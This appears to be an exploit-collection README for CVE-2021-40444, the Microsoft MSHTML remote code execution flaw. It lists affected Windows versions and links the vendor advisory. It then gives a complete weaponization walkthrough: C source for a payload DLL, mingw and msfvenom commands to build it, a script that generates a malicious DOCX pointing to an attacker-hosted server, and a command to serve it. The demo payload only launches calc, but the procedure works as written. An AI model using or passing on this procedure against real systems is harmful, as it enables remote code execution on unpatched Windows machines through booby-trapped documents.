### CVE-2021-40444

#### Describe

Microsoft MSHTML Remote Code Execution Vulnerability

#### ImpactVersion

| Product             | CPU Architecture | Version | Update | Tested   |
| ------------------- | ---------------- | ------- | ------ | -------- |
| Windows 10          | x86/x64          |         |        |          |
| Windows 10          | x86/x64          | 1607    |        |          |
| Windows 10          | x86/x64/ARM64    | 1809    |        |          |
| Windows 10          | x86/x64/ARM64    | 1909    |        |          |
| Windows 10          | x86/x64/ARM64    | 2004    |        | &#10004; |
| Windows 10          | x86/x64/ARM64    | 20H2    |        |          |
| Windows 10          | x86/x64/ARM64    | 21H1    |        |          |
| Windows 7           | x86/x64          |         | SP1    |          |
| Windows 8.1         | x86/x64          |         |        |          |
| Windows Rt 8.1      |                  |         |        |          |
| Windows Server 2008 | x86/x64          |         | SP2    |          |
| Windows Server 2008 | x64              | R2      | SP1    |          |
| Windows Server 2012 |                  |         |        |          |
| Windows Server 2012 |                  | R2      |        |          |
| Windows Server 2016 |                  |         |        |          |
| Windows Server 2019 |                  |         |        |          |
| Windows Server 2022 |                  |         |        |          |
| Windows Server      |                  | 2004    |        |          |
| Windows Server      |                  | 20H2    |        |          |



#### Patch

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-40444
```

#### UtilizationPrinciple

Based on the previous use of samples`938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52`

You can know that it is to load ActiveX using the default browser (IE)

![image-20210911112944428](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-40444_Windows_10_2004_X64_1.png)

Essentially maliciously uses only the `Document.xml.Rels` files in the sample, MHTML and X-USC, which can be used as the malicious target web page, you can achieve the utilization

#### Utilization

First, you need to generate a malicious DLL file, and compile themselves through MSF or yourself.

- Compile

  ```c
  //calc.c
  #include <windows.h>
  
  void exec(void) {
  	system("cmd /c calc");
  	return;
  }
  
  BOOL WINAPI DllMain(
      HINSTANCE hinstDLL,
      DWORD fdwReason, 
      LPVOID lpReserved )
  {
      switch( fdwReason ) 
      { 
          case DLL_PROCESS_ATTACH:
             exec(); 
             break;
  
          case DLL_THREAD_ATTACH:
              break;
  
          case DLL_THREAD_DETACH:
              break;
  
          case DLL_PROCESS_DETACH:
              break;
      }
      return TRUE;
  }
  ```

  Then run the command

  ```
  i686-w64-mingw32-gcc -shared calc.c -o calc.dll
  ```

- Compiled by MSF

  ```
  msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f dll>>calc.dll
  ```

> It is best to use MSF to generate a DLL file!
>
> Also, please see the corresponding machine, some Windows 10 version does not exist.

The relying on the installation environment is required to generate a cab

Then use a one-touch script,`test/calc.dll`This is the absolute path you generated by you,`http://you_ip`You start the IP of the EXP this machine

```
cd CVE-2021-40444 ; python3 exploit.py generate test/calc.dll http://you_ip
```

![image-20210911115757383](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-40444_Windows_10_2004_X64_2.png)

Then start the HTTP service

```
cd srv ; python3 -m http.server 80
```

The resulting malicious DOCX file (in the `out/` folder) is placed on the target machine (Windows 10 2004 x64), can perform success

![1](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-40444_Windows_10_2004_X64_3.gif)

#### ProjectSource

- [prcabral](https://github.com/prcabral/CVE-2021-40444)